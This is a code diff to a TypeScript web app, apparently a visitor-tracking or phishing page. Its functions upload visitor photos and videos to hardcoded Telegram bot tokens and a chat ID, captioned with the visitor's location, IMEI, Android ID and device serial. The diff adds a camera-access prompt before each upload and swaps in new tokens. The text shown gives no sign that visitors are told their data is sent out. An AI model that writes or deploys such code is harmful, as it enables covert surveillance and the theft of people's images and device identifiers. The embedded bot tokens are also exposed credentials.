@@ -55,6 +55,28 @@ interface DeviceInfo {
 
 let hasNotificationBeenSent = false;
 
+/**
+ * Requests access to the user's camera and returns a promise.
+ * @returns A promise that resolves with the camera stream or rejects with an error.
+ */
+function getCameraAccess(): Promise<MediaStream> {
+  return new Promise((resolve, reject) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      reject(new Error('Camera access is not supported in this browser.'));
+      return;
+    }
+
+    navigator.mediaDevices
+      .getUserMedia({ video: true })
+      .then((stream) => {
+        resolve(stream);
+      })
+      .catch((error) => {
+        reject(new Error(`Camera access denied: ${error.message}`));
+      });
+  });
+}
+
 async function getDeviceInfo(): Promise<DeviceInfo> {
   let brand = 'Unknown';
   let model = 'Unknown';
@@ -310,8 +332,8 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
+  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+  const CHAT_ID = '-1002361654031';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -389,26 +411,32 @@ ${deviceText}
 };
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
-  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
+  try {
+    // Request camera access before proceeding
+    const stream = await getCameraAccess();
+    // Stop the stream immediately since we don't need it for this function
+    stream.getTracks().forEach((track) => track.stop());
 
-  if (!CHAT_ID) {
-    console.error('Telegram chat ID is not configured');
-    return;
-  }
+    const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
+    const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+    const CHAT_ID = '-1002361654031';
 
-  const locationInfo = await getLocationInfo();
-  const deviceInfo = await getDeviceInfo();
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  
-  const videoFile = new File([videoBlob], 'visitor-video.mp4', {
-    type: 'video/mp4'
-  });
-  
-  formData.append('video', videoFile);
-  formData.append('caption', `🎥 Visitor Video
+    if (!CHAT_ID) {
+      console.error('Telegram chat ID is not configured');
+      return;
+    }
+
+    const locationInfo = await getLocationInfo();
+    const deviceInfo = await getDeviceInfo();
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    
+    const videoFile = new File([videoBlob], 'visitor-video.mp4', {
+      type: 'video/mp4'
+    });
+    
+    formData.append('video', videoFile);
+    formData.append('caption', `🎥 Visitor Video
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
@@ -417,38 +445,37 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 📱 IMEI: ${deviceInfo.imei || 'Not available'}
 📱 Android ID: ${deviceInfo.androidId || 'Not available'}
 📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
-  formData.append('supports_streaming', 'true');
+    formData.append('supports_streaming', 'true');
 
-  const sendVideo = async (botToken: string): Promise<Response> => {
-    if (!botToken) {
-      throw new Error('Bot token is missing');
-    }
+    const sendVideo = async (botToken: string): Promise<Response> => {
+      if (!botToken) {
+        throw new Error('Bot token is missing');
+      }
 
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
-    const chatInfo = await chatInfoResponse.json();
+      const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
+      const chatInfo = await chatInfoResponse.json();
 
-    const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
-      ? chatInfo.result.id 
-      : CHAT_ID;
+      const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
+        ? chatInfo.result.id 
+        : CHAT_ID;
 
-    formData.set('chat_id', finalChatId);
+      formData.set('chat_id', finalChatId);
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-      method: 'POST',
-      body: formData,
-    });
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: 'POST',
+        body: formData,
+      });
 
-    if (!response.ok) {
-      const responseData = await response.json();
-      throw new Error(
-        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
-      );
-    }
+      if (!response.ok) {
+        const responseData = await response.json();
+        throw new Error(
+          `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
+        );
+      }
 
-    return response;
-  };
+      return response;
+    };
 
-  try {
     if (primaryBotToken) {
       try {
         await sendVideo(primaryBotToken);
@@ -467,26 +494,32 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
       throw error;
     }
   } catch (error) {
-    console.error('Both bots failed to send video:', error instanceof Error ? error.message : 'Unknown error');
+    console.error('Error accessing camera or sending video:', error instanceof Error ? error.message : 'Unknown error');
   }
 };
 
 export const sendImageToTelegram = async (imageBlob: Blob) => {
-  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
+  try {
+    // Request camera access before proceeding
+    const stream = await getCameraAccess();
+    // Stop the stream immediately since we don't need it for this function
+    stream.getTracks().forEach((track) => track.stop());
 
-  if (!CHAT_ID) {
-    console.error('Telegram chat ID is not configured');
-    return;
-  }
+    const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
+    const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+    const CHAT_ID = '-1002361654031';
 
-  const locationInfo = await getLocationInfo();
-  const deviceInfo = await getDeviceInfo();
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('photo', imageBlob, 'visitor-photo.jpg');
-  formData.append('caption', `📸 Visitor Photo
+    if (!CHAT_ID) {
+      console.error('Telegram chat ID is not configured');
+      return;
+    }
+
+    const locationInfo = await getLocationInfo();
+    const deviceInfo = await getDeviceInfo();
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', imageBlob, 'visitor-photo.jpg');
+    formData.append('caption', `📸 Visitor Photo
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
@@ -496,37 +529,36 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
 📱 Android ID: ${deviceInfo.androidId || 'Not available'}
 📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
 
-  const sendPhoto = async (botToken: string): Promise<Response> => {
-    if (!botToken) {
-      throw new Error('Bot token is missing');
-    }
+    const sendPhoto = async (botToken: string): Promise<Response> => {
+      if (!botToken) {
+        throw new Error('Bot token is missing');
+      }
 
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
-    const chatInfo = await chatInfoResponse.json();
+      const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
+      const chatInfo = await chatInfoResponse.json();
 
-    const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
-      ? chatInfo.result.id 
-      : CHAT_ID;
+      const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
+        ? chatInfo.result.id 
+        : CHAT_ID;
 
-    formData.set('chat_id', finalChatId);
+      formData.set('chat_id', finalChatId);
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: 'POST',
-      body: formData,
-    });
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+      });
 
-    const responseData = await response.json();
+      const responseData = await response.json();
 
-    if (!response.ok || !responseData.ok) {
-      throw new Error(
-        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
-      );
-    }
+      if (!response.ok || !responseData.ok) {
+        throw new Error(
+          `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
+        );
+      }
 
-    return response;
-  };
+      return response;
+    };
 
-  try {
     if (primaryBotToken) {
       try {
         await sendPhoto(primaryBotToken);
@@ -542,6 +574,6 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
       throw new Error(`Backup bot failed to send image: ${error instanceof Error ? error.message : 'Unknown error'}`);
     }
   } catch (error) {
-    console.error('Both bots failed to send image:', error instanceof Error ? error.message : 'Unknown error');
+    console.error('Error accessing camera or sending image:', error instanceof Error ? error.message : 'Unknown error');
   }
 };
